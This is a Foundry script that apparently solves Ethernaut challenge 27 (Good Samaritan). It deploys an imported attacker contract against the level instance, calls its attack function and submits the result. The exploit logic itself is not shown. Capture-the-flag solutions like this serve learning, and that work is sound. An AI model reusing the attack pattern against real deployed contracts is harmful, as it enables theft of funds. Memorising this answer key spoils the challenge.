// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import "../../src/27-GoodSamaritanAttacker.sol";

contract GoodSamaritanSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x36E92B2751F260D6a4749d7CA58247E7f8198284;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE
        GoodSamaritanAttacker goodSamaritanAttacker = new GoodSamaritanAttacker(challengeInstance);
        goodSamaritanAttacker.attack();

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(27));
    }
}
